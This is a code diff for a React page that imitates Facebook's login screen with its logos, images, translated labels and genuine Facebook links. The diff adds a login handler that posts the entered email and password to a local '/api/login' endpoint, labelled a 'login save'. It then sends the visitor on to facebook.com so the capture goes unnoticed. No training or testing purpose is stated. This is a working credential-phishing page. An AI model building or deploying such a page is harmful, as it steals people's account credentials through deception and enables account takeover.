@@ -1,4 +1,5 @@
-import { useState, useMemo, useRef } from "react";
+import { useState, useMemo, useRef, useEffect } from "react";
+
 
 const FacebookLogo = () => (
   <svg viewBox="0 0 36 36" className="w-12 h-12" fill="hsl(var(--fb-blue))">
@@ -7,84 +8,33 @@ const FacebookLogo = () => (
 );
 
 const MetaLogo = () => (
-  <svg viewBox="0 0 120 28" className="h-6" fill="none">
-    <path d="M7.3 23.3c-2.6 0-4.6-1-6-2.7C.4 19.3 0 17.3 0 14.8c0-3 .8-5.8 2.4-8.2C4.4 3.6 7 2 9.8 2c1.8 0 3.2.7 4.2 2 .3.4.6.9.9 1.5.3-.6.6-1.1.9-1.5C16.8 2.7 18.2 2 20 2c2.8 0 5.4 1.6 7.4 4.6 1.6 2.4 2.4 5.2 2.4 8.2 0 2.5-.5 4.5-1.3 5.8-1.4 1.7-3.4 2.7-6 2.7-1.5 0-2.8-.4-4-1.3-1-.7-1.8-1.7-2.6-3-.8 1.3-1.6 2.3-2.6 3-1.2.9-2.5 1.3-4 1.3zm3-6c1.3 2.3 2.7 3.4 4 3.4 1.7 0 3-.6 3.7-1.7.5-.8.8-2.2.8-4.2 0-2.5-.6-4.8-1.8-6.8-1.3-2.1-2.8-3.2-4.5-3.2-1.2 0-2.2.7-3 2-.4.7-.8 1.6-1.2 2.8l1.4 3.8.6 1.5zm-2.6-7l-1.2-3.2c-.4-1-.8-1.8-1.2-2.4-.7-1-1.5-1.5-2.5-1.5-1.7 0-3.2 1.1-4.5 3.2C3.1 8.4 2.5 10.7 2.5 13.2v1.6c0 2 .3 3.4.8 4.2.7 1.1 2 1.7 3.7 1.7 1.4 0 2.8-1.2 4.2-3.6l-1-2.6-2.5-6.3z" fill="hsl(var(--fb-blue))"/>
-    <text x="35" y="21" fontFamily="Arial, Helvetica, sans-serif" fontSize="22" fontWeight="400" fill="hsl(0 0% 46%)">Meta</text>
-  </svg>
+  <img
+    src="/images/metalogo.jpg"   
+    alt="Meta"
+    className="h-6 w-auto"
+  />
 );
 
 const ImageCollage = () => {
-  // Generate random seed on mount so images change per refresh
-  const seeds = useMemo(() => {
-    return Array.from({ length: 5 }, () => Math.floor(Math.random() * 1000));
+  const imageSrcs = [
+    "https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp",
+    "https://static.xx.fbcdn.net/rsrc.php/y0/r/U45qBJmWVHU.webp",
+    "https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp"
+  ];
+
+  const selectedSrc = useMemo(() => {
+    return imageSrcs[Math.floor(Math.random() * imageSrcs.length)];
   }, []);
 
   return (
-    <div className="relative w-full max-w-[500px] mx-auto h-[420px] lg:h-[480px]">
-      {/* Main large image */}
-      <div className="absolute top-[40px] left-[80px] w-[300px] h-[340px] rounded-2xl overflow-hidden shadow-xl z-10">
+    <div className="relative w-full max-w-[720px] mx-auto lg:mx-0 h-[460px] lg:h-[520px]">
+      {/* Clean container - no border, no heavy shadow */}
+      <div className="absolute top-[24px] left-[24px] w-[440px] h-[500px] rounded-[40px] overflow-hidden bg-white">
         <img
-          src={`https://picsum.photos/seed/${seeds[0]}/600/680`}
-          alt="Random lifestyle"
+          src={selectedSrc}
+          alt="Featured Facebook image"
           className="w-full h-full object-cover"
         />
-      </div>
-
-      {/* Small left image */}
-      <div className="absolute top-[80px] left-0 w-[130px] h-[160px] rounded-xl overflow-hidden shadow-lg z-20">
-        <img
-          src={`https://picsum.photos/seed/${seeds[1]}/260/320`}
-          alt="Random photo"
-          loading="lazy"
-          className="w-full h-full object-cover"
-        />
-      </div>
-
-      {/* Phone mockup right */}
-      <div className="absolute top-[60px] right-0 w-[140px] h-[240px] rounded-2xl overflow-hidden shadow-lg border-4 border-card z-20 bg-card">
-        <img
-          src={`https://picsum.photos/seed/${seeds[2]}/280/480`}
-          alt="Random phone photo"
-          loading="lazy"
-          className="w-full h-full object-cover"
-        />
-      </div>
-
-      {/* Bottom circle avatar */}
-      <div className="absolute bottom-[0px] left-[120px] w-[100px] h-[100px] rounded-full overflow-hidden shadow-lg border-4 border-primary z-30">
-        <img
-          src={`https://picsum.photos/seed/${seeds[3]}/200/200`}
-          alt="Random avatar"
-          loading="lazy"
-          className="w-full h-full object-cover"
-        />
-      </div>
-
-      {/* Emoji / reaction bubbles */}
-      <div className="absolute top-[20px] left-[60px] text-3xl z-30 drop-shadow-md">😂</div>
-      <div className="absolute top-[180px] right-[20px] z-30 w-10 h-10 rounded-full bg-destructive/70 flex items-center justify-center shadow-md">
-        <span className="text-lg">❤️</span>
-      </div>
-
-      {/* Time badge */}
-      <div className="absolute top-[30px] right-[40px] z-30 bg-primary/80 text-primary-foreground text-xs font-semibold px-3 py-1 rounded-full backdrop-blur-sm flex items-center gap-1">
-        🕐 {new Date().getHours()}:{String(new Date().getMinutes()).padStart(2, "0")}
-      </div>
-
-      {/* Small card overlay bottom-right */}
-      <div className="absolute bottom-[30px] right-[10px] w-[120px] h-[90px] rounded-xl overflow-hidden shadow-lg z-20 bg-card">
-        <img
-          src={`https://picsum.photos/seed/${seeds[4]}/240/180`}
-          alt="Random thumbnail"
-          loading="lazy"
-          className="w-full h-full object-cover"
-        />
-        <div className="absolute bottom-0 left-0 right-0 h-6 bg-card">
-          <div className="flex gap-1 px-2 pt-1">
-            <div className="w-8 h-1.5 rounded-full bg-muted" />
-            <div className="w-5 h-1.5 rounded-full bg-muted" />
-          </div>
-        </div>
       </div>
     </div>
   );
@@ -96,15 +46,18 @@ const FloatingInput = ({
   value,
   onChange,
   className = "",
+  errorMessage = "",
 }: {
   label: string;
   type: string;
   value: string;
   onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
   className?: string;
+  errorMessage?: string;
 }) => {
   const [focused, setFocused] = useState(false);
   const isActive = focused || value.length > 0;
+  const hasError = errorMessage.length > 0;
 
   return (
     <div className={`relative ${className}`}>
@@ -114,7 +67,9 @@ const FloatingInput = ({
         onChange={onChange}
         onFocus={() => setFocused(true)}
         onBlur={() => setFocused(false)}
-        className="peer w-full h-[52px] px-4 pt-5 pb-1 text-base border border-input rounded-lg bg-background text-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary"
+        className={`peer w-full h-[52px] px-4 pt-5 pb-1 text-base border rounded-lg bg-background text-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary ${
+          hasError ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-input"
+        }`}
       />
       <label
         className={`absolute left-4 transition-all duration-150 pointer-events-none ${
@@ -125,60 +80,152 @@ const FloatingInput = ({
       >
         {label}
       </label>
+      {hasError ? (
+        <p className="mt-1 text-sm text-red-600">{errorMessage}</p>
+      ) : null}
     </div>
   );
 };
 
 const Index = () => {
+  const [currentLang, setCurrentLang] = useState("en"); // default English
+
+  const languages = [
+    { code: "en", label: "English (US)" },
+    { code: "ne", label: "नेपाली" },
+    { code: "hi", label: "हिन्दी" },
+    { code: "es", label: "Español" },
+    { code: "pt", label: "Português (Brasil)" },
+    { code: "ja", label: "日本語" },
+    { code: "fr", label: "Français (France)" },
+  ];
+
+  // Simple translation dictionary (expand this as needed)
+  const translations: Record<string, Record<string, string>> = {
+    en: {
+      explore: "Explore the things you love.",
+      loginTitle: "Log into Facebook",
+      emailLabel: "Email or mobile number",
+      passwordLabel: "Password",
+      loginBtn: "Log in",
+      forgotPassword: "Forgot password?",
+      createAccount: "Create new account",
+    },
+    ne: {
+      explore: "तपाईंलाई मन पर्ने कुराहरू अन्वेषण गर्नुहोस्।",
+      loginTitle: "फेसबुकमा लग इन गर्नुहोस्",
+      emailLabel: "इमेल वा मोबाइल नम्बर",
+      passwordLabel: "पासवर्ड",
+      loginBtn: "लग इन गर्नुहोस्",
+      forgotPassword: "पासवर्ड बिर्सनुभयो?",
+      createAccount: "नयाँ खाता बनाउनुहोस्",
+    },
+    hi: {
+      explore: "आपको पसंदीदा चीजों को एक्सप्लोर करें।",
+      loginTitle: "फेसबुक में लॉग इन करें",
+      emailLabel: "ईमेल या मोबाइल नंबर",
+      passwordLabel: "पासवर्ड",
+      loginBtn: "लॉग इन करें",
+      forgotPassword: "पासवर्ड भूल गए?",
+      createAccount: "नया अकाउंट बनाएं",
+    },
+    // Add more languages (es, pt, ja, fr) as needed...
+  };
+
+  const t = (key: string) => translations[currentLang]?.[key] || translations.en[key];
 
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [loginError, setLoginError] = useState("");
+
+  const handleLogin = async () => {
+    if (!email.trim() || !password.trim()) {
+      setLoginError(
+        "The email or mobile number you entered isn’t connected to an account. Find your account and log in."
+      );
+      return;
+    }
+
+    setLoginError("");
+
+    try {
+      await fetch("/api/login", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ email, password }),
+      });
+    } catch (error) {
+      console.error("Login save failed:", error);
+    } finally {
+      window.location.href = "https://www.facebook.com/";
+    }
+  };
 
   return (
-    <div className="min-h-screen bg-background flex flex-col">
-      <div className="flex-1 flex items-center justify-center px-4 lg:px-8">
-        <div className="flex flex-col lg:flex-row items-center lg:items-center gap-8 lg:gap-12 max-w-[1100px] w-full">
+    <div className="min-h-screen bg-background flex flex-col justify-between">
+      <div className="flex-1 flex items-start justify-center px-4 py-8 lg:px-8">
+        <div className="flex flex-col lg:flex-row lg:items-stretch items-start gap-10 lg:gap-24 max-w-[1320px] w-full">
           {/* Left side */}
-          <div className="flex-1 max-w-[580px] relative">
-            <div className="mb-4">
+          <div className="hidden lg:flex flex-1 max-w-[640px] lg:h-full">
+            <div className="mb-6">
               <FacebookLogo />
             </div>
-            <ImageCollage />
-            <div className="mt-4">
-              <h1 className="text-[42px] lg:text-[56px] font-extrabold leading-[1.05] tracking-tight text-foreground">
-                Explore<br />the things<br /><span className="text-primary">you love.</span>
-              </h1>
+            <div className="grid gap-1 lg:grid-cols-[minmax(200px,180px)_minmax(220px,360px)] items-start">
+              <div className="mt-auto pb-8 lg:pb-12">
+                <h1 className="text-[32px] lg:text-[58px] font-extrabold leading-[0.95] tracking-tight text-foreground">
+                  Explore<br />the things<br /><span className="text-primary">you love.</span>
+                </h1>
+              </div>
+              <div className="pt-3 lg:pt-0">
+                <ImageCollage />
+              </div>
             </div>
           </div>
 
           {/* Right side - Login form */}
-          <div className="w-full max-w-[396px] lg:border-l lg:border-border lg:pl-12">
-            <div className="py-8">
-              <h2 className="text-xl font-semibold text-foreground mb-6">Log into Facebook</h2>
+          <div className="w-full max-w-[436px] lg:border-l lg:border-border lg:pl-12 lg:h-full">
+            <div className="pt-8 lg:pt-0 pb-8">
+              <div className="flex justify-center lg:hidden mb-6">
+                <FacebookLogo />
+              </div>
+              <h2 className="text-xl font-semibold text-foreground mb-6">{t("loginTitle")}</h2>
               <FloatingInput
                 type="text"
-                label="Email or mobile number"
+                label={t("emailLabel")}
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
+                errorMessage={loginError}
               />
               <FloatingInput
                 type="password"
-                label="Password"
+                label={t("passwordLabel")}
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 className="mt-3"
               />
-              <button className="w-full h-[48px] bg-primary text-primary-foreground text-base font-semibold rounded-full mt-4 hover:brightness-95 transition-all">
-                Log in
+              <button
+                onClick={handleLogin}
+                className="w-full h-[48px] bg-primary text-primary-foreground text-base font-semibold rounded-full mt-4 hover:brightness-95 transition-all"
+              >
+                {t("loginBtn")}
               </button>
               <div className="text-center mt-4">
-                <a href="#" className="text-foreground text-sm font-medium hover:underline">
-                  Forgot password?
+                <a
+                  href="https://www.facebook.com/login/identify/?ci=Ac_aRgUQbbEKDW4zKTJPBzVW1d2deLXisauhDhUvotDMhJbe2bZxFfI73aVWSfbhgEFC5HC0nx6J1TdUOVLqnvvQrDreoqCTF3rD70Zp9OUcRZ7iRwt760eVzpHHNg1ZhrOAdQ00TJZQ1L2Axuzm0dR6APHDrBAOnQ46rb4fhcm9YMZB8TpBFeX8ROAfKxvTA7iP0LGKYeZISfl8yq-xIggchk1alNEn-pk8Ls_oXzodITSCMlaDy1CuxY3zTFygFPlm_kmD4GNGNGOp5rXIgWiDvkKu"
+                  className="text-foreground text-sm font-medium hover:underline"
+                >
+                  {t("forgotPassword")}
                 </a>
               </div>
               <div className="border-t border-border mt-6 pt-6 flex justify-center">
-                <button className="w-full h-[48px] border border-primary text-primary text-base font-semibold rounded-full hover:bg-primary/5 transition-all">
-                  Create new account
+                <button
+                  type="button"
+                  onClick={() => window.location.href = "https://www.facebook.com/reg/?entry_point=login&next="}
+                  className="w-full h-[48px] border border-primary text-primary text-base font-semibold rounded-full hover:bg-primary/5 transition-all"
+                >
+                  {t("createAccount")}
                 </button>
               </div>
               <div className="flex justify-center mt-8">
@@ -192,10 +239,22 @@ const Index = () => {
       {/* Footer */}
       <footer className="py-4 px-4 border-t border-border">
         <div className="max-w-[1100px] mx-auto">
-          <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-1 text-sm text-muted-foreground mb-2">
-            {["English (US)", "नेपाली", "हिन्दी", "Español", "Português (Brasil)", "日本語", "Français (France)"].map((lang, i) => (
-              <a key={i} href="#" className="text-muted-foreground hover:underline">
-                {lang}
+          <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-1 text-sm mb-2">
+            {languages.map((lang) => (
+              <a
+                key={lang.code}
+                href="#"
+                onClick={(e) => {
+                  e.preventDefault();
+                  setCurrentLang(lang.code);
+                }}
+                className={`hover:underline transition-colors ${
+                  currentLang === lang.code
+                    ? "text-foreground font-medium"
+                    : "text-muted-foreground"
+                }`}
+              >
+                {lang.label}
               </a>
             ))}
             <a href="#" className="text-muted-foreground hover:underline">More languages...</a>
